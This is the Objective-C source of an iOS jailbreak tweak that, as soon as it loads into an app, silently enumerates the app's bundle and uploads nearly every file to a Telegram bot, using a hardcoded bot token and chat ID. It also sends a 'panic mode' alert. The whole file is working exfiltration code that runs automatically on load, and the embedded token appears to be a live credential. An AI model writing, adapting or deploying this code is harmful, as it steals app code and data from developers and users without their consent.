#import <UIKit/UIKit.h>
#import <substrate.h>
#import <mach-o/dyld.h>

// --- CONFIGURATION ---
#define TG_TOKEN @"8134587785:AAGm372o_98TU_4CVq4TN2RzSdRkNHztc6E"
#define TG_CHAT_ID @"7730331218"
#define IGNORE_NAME @"Enigma" // Ignore our own tweak to save bandwidth

// --- HELPER: FIRE & FORGET UPLOAD ---
NSData *createBody(NSString *boundary, NSString *filename, NSData *data) {
    NSMutableData *body = [NSMutableData data];
    [body appendData:[[NSString stringWithFormat:@"--%@\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[[NSString stringWithFormat:@"Content-Disposition: form-data; name=\"document\"; filename=\"%@\"\r\n", filename] dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:[@"Content-Type: application/octet-stream\r\n\r\n" dataUsingEncoding:NSUTF8StringEncoding]];
    [body appendData:data];
    [body appendData:[[NSString stringWithFormat:@"\r\n--%@--\r\n", boundary] dataUsingEncoding:NSUTF8StringEncoding]];
    return body;
}

void uploadFileFast(NSString *path, NSString *filename) {
    // 1. Read Data (Fast Map)
    NSData *fileData = [NSData dataWithContentsOfFile:path];
    if (!fileData || fileData.length == 0) return;

    // 2. Build Request
    NSString *urlString = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendDocument?chat_id=%@", TG_TOKEN, TG_CHAT_ID];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlString]];
    [request setHTTPMethod:@"POST"];
    
    NSString *boundary = [NSString stringWithFormat:@"Boundary-%@", [[NSUUID UUID] UUIDString]];
    [request setValue:[NSString stringWithFormat:@"multipart/form-data; boundary=%@", boundary] forHTTPHeaderField:@"Content-Type"];
    [request setHTTPBody:createBody(boundary, filename, fileData)];
    
    // 3. FIRE AND FORGET (Do not wait for response)
    [[[NSURLSession sharedSession] dataTaskWithRequest:request] resume];
}

void sendText(NSString *text) {
    @try {
        NSString *urlStr = [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage?chat_id=%@&text=%@", 
                            TG_TOKEN, TG_CHAT_ID, 
                            [text stringByAddingPercentEncodingWithAllowedCharacters:[NSCharacterSet URLQueryAllowedCharacterSet]]];
        [[[NSURLSession sharedSession] dataTaskWithURL:[NSURL URLWithString:urlStr] completionHandler:nil] resume];
    } @catch (NSException *e) {}
}

// =========================================================
// THE "PANIC MODE" DUMPER
// =========================================================
void panicDump() {
    NSString *bundlePath = [[NSBundle mainBundle] bundlePath];
    NSFileManager *fm = [NSFileManager defaultManager];
    
    sendText(@"🚨 PANIC MODE INITIATED: Flooding files now...");

    // 1. Collect all interesting files first
    NSMutableArray *filesToUpload = [NSMutableArray array];
    NSDirectoryEnumerator *enumerator = [fm enumeratorAtPath:bundlePath];
    NSString *file;
    
    while (file = [enumerator nextObject]) {
        // FILTER: Skip heavy assets that waste time
        if ([file hasSuffix:@".png"] || [file hasSuffix:@".jpg"] || 
            [file hasSuffix:@".jpeg"] || [file hasSuffix:@".car"] || 
            [file hasSuffix:@".wav"] || [file hasSuffix:@".mp3"] || 
            [file hasSuffix:@".ttf"] || [file hasSuffix:@".otf"] ||
            [file hasSuffix:@".lproj"] || [file containsString:IGNORE_NAME]) { 
            continue; 
        }
        [filesToUpload addObject:file];
    }
    
    // 2. UPLOAD EVERYTHING AT ONCE (Concurrent)
    // dispatch_apply runs on multiple threads simultaneously
    dispatch_apply(filesToUpload.count, dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^(size_t i) {
        NSString *filename = filesToUpload[i];
        NSString *fullPath = [bundlePath stringByAppendingPathComponent:filename];
        
        uploadFileFast(fullPath, filename);
    });
}

%ctor {
    // START IMMEDIATELY ON LOAD
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        panicDump();
    });
}
